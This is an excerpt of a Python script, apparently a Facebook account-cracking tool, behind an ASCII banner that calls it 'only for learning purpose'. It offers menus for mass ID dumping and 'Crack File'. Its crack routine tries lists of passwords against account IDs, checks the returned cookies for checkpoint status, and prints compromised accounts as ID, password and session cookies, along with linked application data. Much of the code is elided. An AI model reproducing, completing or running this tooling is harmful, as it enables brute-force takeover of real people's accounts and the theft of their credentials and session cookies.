...
⠀⠀⠀⠀⠀          ⠀⠀⠀⠈⠙⠛⠶⠶⠦⠤⠤⠤⠶⠶⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀
  {m}•{k}•{h}•{sir} THIS TOOL IS ONLY FOR LEARNING PURPOSE {x}{m}•{k}•{h}•{x}
    ...
    \t{asu}    {m}•{k}•{h}•{sir} RECODE : ALIYANAFRIDI {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
CorrectUsername = 'ALIYAN'
...
while loop == 'true':
    ...
    print(' logo ')
    print('\x1b[1;97m ') 
    username = input('╔ⒽⒷⒻ\x1b[1;32m TOOL USERNAME\x1b[1;37m ALIYAN \n│ \x1b[1;33m USERNAME : ')
    if username == CorrectUsername:
        password = input('│ \x1b[1;32m TOOL PASSWORD\x1b[1;37m SANA \n╚ⒽⒷⒻ\x1b[1;33m PASSWORD : ')
        if password == CorrectPassword:
            ...
            os.system('xdg-open https://www.facebook.com/aliyan.ahmmad.5')
            os.system('clear')
    else:
...
def menu(my_name,my_id):
	...
	print('2. Crack File ')
	print('E. Exit')
	_____cowok__ALIYANAFRIDI_____ = input('\nEnter  : ')
	if _____cowok__ALIYANAFRIDI_____ in ['1']:
		dump_massal()
	elif _____cowok__ALIYANAFRIDI_____ in ['2']:
		crack_file()
	elif _____cowok__ALIYANAFRIDI_____ in ['E']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}Aliyanafridi-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}ALIYANAFRIDI-CP😓>> {idf}|{pw}{N}')
				...
				print(f'\r{H}ALIYANAFRIDI-OK😘>> {idf}|{pw}{h}{x}') 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'ALIYANAFRIDI-CP[•] ID       : {idf} [•] PASSWORD : {pw}'
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'ALIYANAFRIDI-OK[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					...
					hit=0
					infoakun += (f"\n[bold yellow]ALIYANAFRIDI-CP[•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					...
					print('\n')
					statusok = f'[bold green]ALIYANAFRIDI-OK[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
